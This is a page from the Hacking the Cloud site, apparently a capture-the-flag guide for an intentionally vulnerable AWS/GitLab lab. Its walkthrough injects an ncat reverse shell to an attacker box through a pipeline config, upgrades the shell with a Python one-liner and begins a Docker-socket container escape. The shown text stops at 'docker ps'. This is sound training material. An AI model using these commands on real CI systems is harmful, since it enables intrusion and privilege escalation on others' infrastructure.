on EC2 with Send Command or Session Manager </span> </a> </li> <li class="md-nav__item"> <a href="../../post_exploitation/s3_acl_persistence/" class="md-nav__link"> <span class="md-ellipsis"> S3 File ACL Persistence </span> </a> </li> <li class="md-nav__item"> <a href="../../post_exploitation/survive_access_key_deletion_with_sts_getfederationtoken/" class="md-nav__link"> <span class="md-ellipsis"> Survive Access Key Deletion with sts:GetFederationToken </span> </a> </li> <li class="md-nav__item"> <a href="../../post_exploitation/user_data_script_persistence/" class="md-nav__link"> <span class="md-ellipsis"> User Data Script Persistence </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6"> <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0"> <span class="md-ellipsis"> Deprecated </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_2_6"> <span class="md-nav__icon md-icon"></span> Deprecated </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../deprecated/stealth_perm_enum/" class="md-nav__link"> <span class="md-ellipsis"> [Deprecated] Enumerate Permissions without Logging to CloudTrail </span> </a> </li> <li class="md-nav__item"> <a href="../../deprecated/whoami/" class="md-nav__link"> <span class="md-ellipsis"> [Deprecated] Whoami - Get Principal Name From Keys </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_7" checked> <label class="md-nav__link" for="__nav_2_7" id="__nav_2_7_label" tabindex="0"> <span class="md-ellipsis"> Capture the Flag </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_7_label" aria-expanded="true"> <label class="md-nav__title" for="__nav_2_7"> <span class="md-nav__icon md-icon"></span> Capture the Flag </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc"> <label class="md-nav__link md-nav__link--active" for="__toc"> <span class="md-ellipsis"> CI/CDon't </span> <span class="md-nav__icon md-icon"></span> </label> <a href="./" class="md-nav__link md-nav__link--active"> <span class="md-ellipsis"> CI/CDon't </span> </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class="md-nav__title" for="__toc"> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix> <li class="md-nav__item"> <a href="#background" class="md-nav__link"> <span class="md-ellipsis"> Background </span> </a> </li> <li class="md-nav__item"> <a href="#how-to-play" class="md-nav__link"> <span class="md-ellipsis"> How to Play </span> </a> </li> <li class="md-nav__item"> <a href="#the-important-bits" class="md-nav__link"> <span class="md-ellipsis"> The Important Bits </span> </a> </li> <li class="md-nav__item"> <a href="#the-story" class="md-nav__link"> <span class="md-ellipsis"> The Story </span> </a> </li> <li class="md-nav__item"> <a href="#the-objective" class="md-nav__link"> <span class="md-ellipsis"> The Objective </span> </a> </li> <li class="md-nav__item"> <a href="#feedback" class="md-nav__link"> <span class="md-ellipsis"> Feedback </span> </a> </li> <li class="md-nav__item"> <a href="#walkthrough" class="md-nav__link"> <span class="md-ellipsis"> Walkthrough </span> </a> </li> <li class="md-nav__item"> <a href="#acknowledgements" class="md-nav__link"> <span class="md-ellipsis"> Acknowledgements </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3"> <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0"> <span class="md-ellipsis"> Azure </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_3"> <span class="md-nav__icon md-icon"></span> Azure </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../azure/abusing-managed-identities/" class="md-nav__link"> <span class="md-ellipsis"> Abusing Managed Identities </span> </a> </li> <li class="md-nav__item"> <a href="../../../azure/anonymous-blob-access/" class="md-nav__link"> <span class="md-ellipsis"> Anonymous Blob Access </span> </a> </li> <li class="md-nav__item"> <a href="../../../azure/enum_email_addresses/" class="md-nav__link"> <span class="md-ellipsis"> Unauthenticated Enumeration of Azure Active Directory Email Addresses </span> </a> </li> <li class="md-nav__item"> <a href="../../../azure/run-command-abuse/" class="md-nav__link"> <span class="md-ellipsis"> Run Command Abuse </span> </a> </li> <li class="md-nav__item"> <a href="../../../azure/soft-deleted-blobs/" class="md-nav__link"> <span class="md-ellipsis"> Soft Deleted Blobs </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4"> <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0"> <span class="md-ellipsis"> GCP </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_4"> <span class="md-nav__icon md-icon"></span> GCP </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1"> <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0"> <span class="md-ellipsis"> General Knowledge </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_4_1"> <span class="md-nav__icon md-icon"></span> General Knowledge </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../gcp/general-knowledge/default-account-names/" class="md-nav__link"> <span class="md-ellipsis"> Default Account Information </span> </a> </li> <li class="md-nav__item"> <a href="../../../gcp/general-knowledge/gcp-buckets/" class="md-nav__link"> <span class="md-ellipsis"> Hunting GCP Buckets </span> </a> </li> <li class="md-nav__item"> <a href="../../../gcp/general-knowledge/metadata_in_google_cloud_instances/" class="md-nav__link"> <span class="md-ellipsis"> Metadata in Google Cloud Instances </span> </a> </li> <li class="md-nav__item"> <a href="../../../gcp/general-knowledge/security-and-constraints/" class="md-nav__link"> <span class="md-ellipsis"> Security and Constraints </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2"> <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0"> <span class="md-ellipsis"> Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_4_2"> <span class="md-nav__icon md-icon"></span> Enumeration </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../gcp/enumeration/enum_email_addresses/" class="md-nav__link"> <span class="md-ellipsis"> Unauthenticated Enumeration of Google Workspace Email Addresses </span> </a> </li> <li class="md-nav__item"> <a href="../../../gcp/enumeration/enumerate_all_permissions/" class="md-nav__link"> <span class="md-ellipsis"> Enumerate Org/Folder/Project Permissions + Individual Resource Permissions </span> </a> </li> <li class="md-nav__item"> <a href="../../../gcp/enumeration/enumerate_service_account_permissions/" class="md-nav__link"> <span class="md-ellipsis"> Enumerate Service Account Permissions </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3"> <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0"> <span class="md-ellipsis"> Exploitation </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_4_3"> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../gcp/exploitation/gcp_iam_privilege_escalation/" class="md-nav__link"> <span class="md-ellipsis"> Privilege Escalation in Google Cloud Platform </span> </a> </li> <li class="md-nav__item"> <a href="../../../gcp/exploitation/tagbindings_privilege_escalation/" class="md-nav__link"> <span class="md-ellipsis"> Tag Your Way In - GCP Privilege Escalation Using Tags </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4"> <label class="md-nav__link" for="__nav_4_4" id="__nav_4_4_label" tabindex="0"> <span class="md-ellipsis"> Avoid Detection </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_4_4"> <span class="md-nav__icon md-icon"></span> Avoid Detection </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../gcp/avoid-detection/apps-script-abuse/" class="md-nav__link"> <span class="md-ellipsis"> Apps Script project impersonation / Google Apps Script persistence </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_5"> <label class="md-nav__link" for="__nav_4_5" id="__nav_4_5_label" tabindex="0"> <span class="md-ellipsis"> Capture the Flag </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_5_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_4_5"> <span class="md-nav__icon md-icon"></span> Capture the Flag </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../gcp/capture_the_flag/gcp-goat/" class="md-nav__link"> <span class="md-ellipsis"> GCP Goat </span> </a> </li> <li class="md-nav__item"> <a href="../../../gcp/capture_the_flag/thunder_ctf/" class="md-nav__link"> <span class="md-ellipsis"> Thunder CTF </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5"> <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0"> <span class="md-ellipsis"> AI and LLM </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_5"> <span class="md-nav__icon md-icon"></span> AI and LLM </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1"> <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="0"> <span class="md-ellipsis"> Exploitation </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_5_1"> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../ai-llm/exploitation/claude_magic_string_denial_of_service/" class="md-nav__link"> <span class="md-ellipsis"> Break LLM Workflows with Claude's Refusal Magic String </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6"> <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0"> <span class="md-ellipsis"> Terraform </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_6"> <span class="md-nav__icon md-icon"></span> Terraform </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../terraform/terraform_ansi_escape_evasion/" class="md-nav__link"> <span class="md-ellipsis"> Terraform ANSI Escape </span> </a> </li> <li class="md-nav__item"> <a href="../../../terraform/terraform_enterprise_metadata_service/" class="md-nav__link"> <span class="md-ellipsis"> Terraform Enterprise: Attack the Metadata Service </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7"> <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0"> <span class="md-ellipsis"> Blog </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_7"> <span class="md-nav__icon md-icon"></span> Blog </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../blog/call_for_ai_research/" class="md-nav__link"> <span class="md-ellipsis"> Call for research: AI and LLM security </span> </a> </li> <li class="md-nav__item"> <a href="../../../blog/2025_wrap-up/" class="md-nav__link"> <span class="md-ellipsis"> 2025 Hacking the Cloud: Year in Review </span> </a> </li> <li class="md-nav__item"> <a href="../../../blog/2024_wrap-up/" class="md-nav__link"> <span class="md-ellipsis"> 2024 Cloud Security Highlights: Hacking the Cloud’s Year in Review </span> </a> </li> <li class="md-nav__item"> <a href="../../../blog/2023_wrap-up/" class="md-nav__link"> <span class="md-ellipsis"> 2023 Wrap-up </span> </a> </li> <li class="md-nav__item"> <a href="../../../blog/2022_wrap-up/" class="md-nav__link"> <span class="md-ellipsis"> 2022 Wrap-up </span> </a> </li> <li class="md-nav__item"> <a href="../../../blog/v2_new_look/" class="md-nav__link"> <span class="md-ellipsis"> Hacking The Cloud v2: New Look </span> </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc"> <div class="md-sidebar__scrollwrap"> <div class="md-sidebar__inner"> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class="md-nav__title" for="__toc"> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix> <li class="md-nav__item"> <a href="#background" class="md-nav__link"> <span class="md-ellipsis"> Background </span> </a> </li> <li class="md-nav__item"> <a href="#how-to-play" class="md-nav__link"> <span class="md-ellipsis"> How to Play </span> </a> </li> <li class="md-nav__item"> <a href="#the-important-bits" class="md-nav__link"> <span class="md-ellipsis"> The Important Bits </span> </a> </li> <li class="md-nav__item"> <a href="#the-story" class="md-nav__link"> <span class="md-ellipsis"> The Story </span> </a> </li> <li class="md-nav__item"> <a href="#the-objective" class="md-nav__link"> <span class="md-ellipsis"> The Objective </span> </a> </li> <li class="md-nav__item"> <a href="#feedback" class="md-nav__link"> <span class="md-ellipsis"> Feedback </span> </a> </li> <li class="md-nav__item"> <a href="#walkthrough" class="md-nav__link"> <span class="md-ellipsis"> Walkthrough </span> </a> </li> <li class="md-nav__item"> <a href="#acknowledgements" class="md-nav__link"> <span class="md-ellipsis"> Acknowledgements </span> </a> </li> </ul> </nav> </div> </div> </div> <div class="md-content" data-md-component="content"> <article class="md-content__inner md-typeset"> <p>Article by Nick Frichette</p> <a href="https://github.com/Hacking-the-Cloud/hackingthe.cloud/edit/main/content/aws/capture_the_flag/cicdont.md" title="Edit this page" class="md-content__button md-icon" rel="edit"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"></path></svg> </a> <h1>CI/CDon't</h1> <p>Link to Project: <a href="https://github.com/Hacking-the-Cloud/htc-ctfs/tree/main/aws/cicdont">CI/CDon't</a></p> <div class="admonition note"> <p class="admonition-title">Note</p> <p>This project will deploy intentionally vulnerable software/infrastructure to your AWS account. Please ensure there is no sensitive or irrecoverable data in the account. Attempts have been made to mitigate this however they may not be fullproof; Security Group rules only allow access to the vulnerable EC2 instance from your public IP address, and a randomly generated password is required to access it.</p> </div> <div class="admonition warning"> <p class="admonition-title">Warning</p> <p>If you intend to play the CTF it is a good idea to read through this page carefully to ensure you have all the details (minus the walkthrough). This page will familiarize the player with how the CTF works, what the objective is, and what the storyline is.</p> </div> <h2 id="background">Background<a class="headerlink" href="#background" title="Permanent link">¶</a></h2> <p>This is an AWS/GitLab CI/CD themed CTF that you can run in your own AWS account. All that is required is an AWS account and Terraform <a href="https://learn.hashicorp.com/tutorials/terraform/install-cli">installed</a> locally on your machine.</p> <p>Costs should be minimal; running this infrastructure in my own account for three hours didn't accrue a cent in the Billing Dashboard, however extended time frames may cause costs to add up.</p> <p>In terms of difficulty, it would be rated low. The goal is more about having fun and working through some simple CI/CD/AWS challenges that even non-security folks would enjoy.</p> <h2 id="how-to-play">How to Play<a class="headerlink" href="#how-to-play" title="Permanent link">¶</a></h2> <p>Clone this repository and navigate to the cicdont directory.</p> <div class="highlight"><pre><span></span><code>git clone https://github.com/Hacking-the-Cloud/htc-ctfs.git
cd htc-ctfs/aws/cicdont
</code></pre></div> <p>To deploy the CTF environment run the Terraform init/apply command.</p> <div class="highlight"><pre><span></span><code>terraform init
terraform apply
</code></pre></div> <p>You will be prompted with two questions. The first is a consent related to the costs of the CTF (Again, these should be minimal however the environment should still be taken down when you're finished with it). The second is asking your player name. Please do not use special characters in the name, only upper and lower case letters. This will be used in the game.</p> <div class="admonition note"> <p class="admonition-title">Note</p> <p>It will take approximately 10 minutes for all the infrastructure to be deployed and ready. This 10 minute timer begins AFTER the Terraform apply has completed. This time is used to install all the software, create the NPCs, etc.</p> </div> <div class="admonition warning"> <p class="admonition-title">Warning</p> <p>To be able to access the vulnerable instance, Terraform will attempt to determine your public IP address and create a security group that only that IP address can access. If you cannot access the target_ip (explained below) after 10 minutes, check the AWS console for a security group named <code>allow_http</code> and ensure that its configuration would allow you to reach it.</p> </div> <p>To destroy the CTF environment run the Terraform destroy command.</p> <div class="highlight"><pre><span></span><code>terraform destroy
</code></pre></div> <p>This will again prompt you for the two questions. Please answer them and the infrastructure will be destroyed.</p> <h2 id="the-important-bits">The Important Bits<a class="headerlink" href="#the-important-bits" title="Permanent link">¶</a></h2> <p>Once you've run terraform apply, you will receive 5 outputs. This will include the following:</p> <ul> <li>Player Username</li> <li>Player Password (randomly generated)</li> <li>Attackbox IP</li> <li>Target IP</li> <li>Time warning</li> </ul> <p>The attackbox is an EC2 instance you can use for whatever purposes you deem fit. In particular you can use it to catch a reverse shell, or load your C2 platform of choice on it (you have sudo access via the password).</p> <p>To access the attackbox, you can ssh using your player username and password.</p> <div class="highlight"><pre><span></span><code>ssh &lt;player username&gt;@&lt;attackbox IP&gt;
</code></pre></div> <div class="admonition note"> <p class="admonition-title">Note</p> <p>When sshing with a player username, note that the username is case-sensitive.</p> </div> <p>It will take approximately 10 minutes for all the infrastructure to finish deploying. If you'd like to test if it's finished, you can navigate to <code>http://&lt;target IP&gt;/</code>. If it doesn't respond, or only shows a generic GitLab login page, then the CTF is not ready yet. If you see a message about SoftHouseIO, then everything is setup and ready.</p> <div class="admonition note"> <p class="admonition-title">Note</p> <p>To be able to access the vulnerable instance, Terraform will attempt to determine your public IP address and create security group rules that only that IP address can access. If you cannot access the target instance after 10 minutes (likely shorter), check the AWS console for a security group named <code>allow_http</code> and ensure that it's configuration would allow you to reach it.</p> <p>These security group rules apply to both the target (GitLab) and the attackbox. Additionally, the rules are configured to allow the attackbox to receive incoming traffic from the target (to catch shells).</p> </div> <p>If you see any references to <code>gamemaster</code>, please ignore it. Those scripts are used to simulate the NPCs and have them complete their lore tasks. It is unrelated to the challenge.</p> <h2 id="the-story">The Story<a class="headerlink" href="#the-story" title="Permanent link">¶</a></h2> <p>You are &lt;player username&gt;, a developer at SoftHouseIO, an independent software development consultancy firm. While you like the company, you're thinking about making a little money on the side, perhaps through not entirely legal means. Can you say ransomware?</p> <p>After planning your attack you figure the best place to get started is the company GitLab server at http://&lt;target IP&gt;. Your username and password should you get you in. You'll want to gain access to administrative credentials for the AWS account the company uses.</p> <h2 id="the-objective">The Objective<a class="headerlink" href="#the-objective" title="Permanent link">¶</a></h2> <p>Gain access to the <code>aws_admin_automation_user</code> through whatever means necessary (Note that this role has no permissions. It is simply the goal).</p> <h2 id="feedback">Feedback<a class="headerlink" href="#feedback" title="Permanent link">¶</a></h2> <p>Want to provide feedback on the challenge? Open a new discussion on <a href="https://github.com/Hacking-the-Cloud/hackingthe.cloud/discussions/categories/ctf-discussion">GitHub</a></p> <h2 id="walkthrough">Walkthrough<a class="headerlink" href="#walkthrough" title="Permanent link">¶</a></h2> <p>The following is a step by step walkthrough of the CTF. You can refer to this if you get stuck or simply just want to know what is next. Click the summary below to expand it.</p> <details class="summary"> <summary>Summary</summary> <p><strong>Consent and Name</strong></p> <p>To begin the CTF we must first stand up all the infrastructure. We do this using Terraform.</p> <p>Download the challenge using git. </p><div class="highlight"><pre><span></span><code>git clone https://github.com/Hacking-the-Cloud/htc-ctfs.git
cd htc-ctfs/aws/cicdont
</code></pre></div><p></p> <p>Initialize the project. </p><div class="highlight"><pre><span></span><code>terraform init
</code></pre></div><p></p> <p>Create the infrastructure. </p><div class="highlight"><pre><span></span><code>terraform apply
</code></pre></div><p></p> <p>We will be prompted first with a consent. Read through the question and answer with yes or no.</p> <p>After this, it will ask for a player name. Please only use lower and uppercase letters. No special characters or numbers.</p> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/capture_the_flag/cicdont/consent.png" data-desc-position="bottom"><img alt="Consent Message" src="../../../images/aws/capture_the_flag/cicdont/consent.png"></a></p> <p>After this, you will be asked if you'd like to perform the deployment. Answer with "yes".</p> <p>The Terraform deployment will begin.</p> <p><strong>Wait</strong></p> <div class="admonition note"> <p class="admonition-title">Note</p> <p>You will now need to wait 10 minutes for the deployment to finish. The 10 minute timer starts <strong>AFTER</strong> you get the "Apply complete" notification.</p> </div> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/capture_the_flag/cicdont/output.png" data-desc-position="bottom"><img alt="Output" src="../../../images/aws/capture_the_flag/cicdont/output.png"></a></p> <p>Does it really take 10 minutes? Yes, it takes a little bit to get everything setup. You can take this time to get familiar with your attackbox. This is an EC2 instance you can use for whatever you need during the CTF, particularly to catch shells.</p> <p>You can ssh into the box using your username and password</p> <div class="highlight"><pre><span></span><code>ssh &lt;player_username&gt;@&lt;target_ip&gt;
</code></pre></div> <div class="admonition note"> <p class="admonition-title">Note</p> <p>The username is case-sensitive.</p> </div> <p><strong>Getting Started</strong></p> <p>After waiting those 10 minutes, you finally have a target. You can navigate to the target_ip to see a GitLab instance. Log in using your player username and password.</p> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/capture_the_flag/cicdont/login.png" data-desc-position="bottom"><img alt="Login Page" src="../../../images/aws/capture_the_flag/cicdont/login.png"></a></p> <p>From here, you can navigate around, explore the various projects, and more. You might even notice a little notification in the upper right hand corner.</p> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/capture_the_flag/cicdont/todo.png" data-desc-position="bottom"><img alt="ToDo" src="../../../images/aws/capture_the_flag/cicdont/todo.png"></a></p> <p>Ashley has some work for us! Perhaps this will give us a hint for something we can exploit.</p> <p>Navigate to the mvp-docker project's Issues page.</p> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/capture_the_flag/cicdont/issue.png" data-desc-position="bottom"><img alt="Issue" src="../../../images/aws/capture_the_flag/cicdont/issue.png"></a></p> <p>This is interesting for a few reasons. Most notably, Ashley wants some help with building a Docker container as a part of the CI/CD pipeline. She also mentions a <a href="https://docs.gitlab.com/ee/ci/yaml/gitlab_ci_yaml.html">gitlab-ci.yml</a> file, which is the configuration for the <a href="https://docs.gitlab.com/ee/ci/">GitLab CI/CD</a> pipeline.</p> <p>Building Docker images as a part of a CI/CD pipeline can have serious security implications and this is definitely worth looking into.</p> <p>Before we can get to that fun, let's take a look at that gitlab-ci.yml file. Navigate there and make some changes (you can edit the file through the web browser if you prefer or you can clone the project locally).</p> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/capture_the_flag/cicdont/config.png" data-desc-position="bottom"><img alt="Config" src="../../../images/aws/capture_the_flag/cicdont/config.png"></a></p> <p>After committing changes (via the web interface or otherwise) you can navigate to the <code>CI/CD</code> tab on the left to see the pipeline execute.</p> <p>Clicking on the status, and then the build job we can see the output.</p> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/capture_the_flag/cicdont/buildoutput.png" data-desc-position="bottom"><img alt="Pipeline Output" src="../../../images/aws/capture_the_flag/cicdont/buildoutput.png"></a></p> <p>This can tell us a few things that are very useful to us as attackers. First, on line 3, we see that the CI/CD pipeline is using the "docker" executor, meaning everything executes inside a Docker container somewhere. On line 6, we see that it is using an Ubuntu Docker image. And lines 20+ show us that our input is executing in this environment.</p> <p>This looks like a fantastic place to start.</p> <p><strong>Getting a Reverse Shell</strong></p> <p>Our next step will be to get a shell in this environment. This is where our attackbox can come in.</p> <p><strong>Please note</strong>: You are welcome to use your C2 platform of choice (If you'd like a recommendation, I'm a fan of <a href="https://github.com/its-a-feature/Mythic">Mythic</a>). For this walkthrough I will use netcat for simplicity.</p> <p>SSH into your attack box and install a tool called <code>ncat</code>.</p> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/capture_the_flag/cicdont/ncat.png" data-desc-position="bottom"><img alt="ncat install" src="../../../images/aws/capture_the_flag/cicdont/ncat.png"></a></p> <p>Now, we can setup a listener (from the attackbox) with the following command.</p> <div class="highlight"><pre><span></span><code>sudo ncat -l 443 --ssl -v
</code></pre></div> <p>We can now go back and edit the gitlab-ci.yml file to send a reverse shell. Using Ncat it's as easy as adding the following lines. From our previous foray we know this is an Ubuntu Docker container, and thus, we can use the <a href="https://en.wikipedia.org/wiki/APT_(software)">apt</a> package manager.</p> <div class="highlight"><pre><span></span><code>apt update
apt install -y ncat
ncat &lt;attackbox_ip&gt; 443 --ssl -e /bin/bash -v
</code></pre></div> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/capture_the_flag/cicdont/newbuild.png" data-desc-position="bottom"><img alt="Second Pipeline" src="../../../images/aws/capture_the_flag/cicdont/newbuild.png"></a></p> <p>Now click "Commit changes" and watch that pipeline run.</p> <p>You are now the proud owner of a reverse shell inside this Docker container.</p> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/capture_the_flag/cicdont/shell.png" data-desc-position="bottom"><img alt="Shell" src="../../../images/aws/capture_the_flag/cicdont/shell.png"></a></p> <p><strong>Docker Socket</strong></p> <p>From here, there are a number of things we could try to do. Your first instinct may be, "I'm on an EC2 instance, can I reach the metadata service?". That's a great idea! Unfortunately you can't.</p> <p>The bright folks over at SoftHouseIO use <a href="https://hackingthe.cloud/aws/general-knowledge/intro_metadata_service/#imdsv2">IMDSv2</a>, one of the benefits of which is that Docker containers cannot reach it by default.</p> <div class="highlight"><pre><span></span><code>TTL of 1: The default configuration of IMDSv2 is to set the Time To Live (TTL) of the TCP packet containing the session token to "1". This ensures that misconfigured network appliances (firewalls, NAT devices, routers, etc.) will not forward the packet on. This also means that Docker containers using the default networking configuration (bridge mode) will not be able to reach the instance metadata service.
</code></pre></div> <p>That's a bummer. Other options? Try and pivot off this machine to something else in the VPC? Access a service exposed internally to the host (172.17.0.1)? Escape the container?</p> <p>That last one might get us somewhere. Ashley mentioned having some issues about building a Docker container in the pipeline. To do that, wouldn't they have to use something like <a href="https://cloud.google.com/blog/products/containers-kubernetes/introducing-kaniko-build-container-images-in-kubernetes-and-google-container-builder-even-without-root-access">kaniko</a>? What if they just exposed the Docker socket instead?</p> <p>When a Docker socket is exposed inside a container, it can have dangerous consequences as an attacker can potentially escape the container and escalate privileges on the host.</p> <p>The common location for the socket is at <code>/var/run/docker.sock</code>, let's go look for it.</p> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/capture_the_flag/cicdont/socket.png" data-desc-position="bottom"><img alt="Finding the Docker Socket" src="../../../images/aws/capture_the_flag/cicdont/socket.png"></a></p> <p>There we go! They did mount the Docker socket! Let's use this to escape the container.</p> <p><strong>Escaping the Container</strong></p> <p>Note: There are many different ways you could abuse this to escape the container. I will walk through what I think is the simplest.</p> <p>First let's install two tools that will make things easier for ourselves.</p> <div class="highlight"><pre><span></span><code>apt update
apt install -y python3 docker.io
</code></pre></div> <p>Python3 will help us to spawn a <code>tty</code> and having the Docker binary will make it easier to interact with the Docker socket. We could alternatively use curl.</p> <p>With those two tools installed, let's spawn a <code>tty</code> with the classic Python <a href="https://netsec.ws/?p=337">one-liner</a>.</p> <div class="highlight"><pre><span></span><code>python3 -c "import pty;pty.spawn('/bin/bash')"
</code></pre></div> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/capture_the_flag/cicdont/view.png" data-desc-position="bottom"><img alt="Creating a TTY" src="../../../images/aws/capture_the_flag/cicdont/view.png"></a></p> <p>Doesn't that looks so much better? We have an actual shell prompt now. This will be useful for interacting with the Docker socket. Speaking of which, let's see which Docker containers are running on the host.</p> <div class="highlight"><pre><span></span><code>docker ps
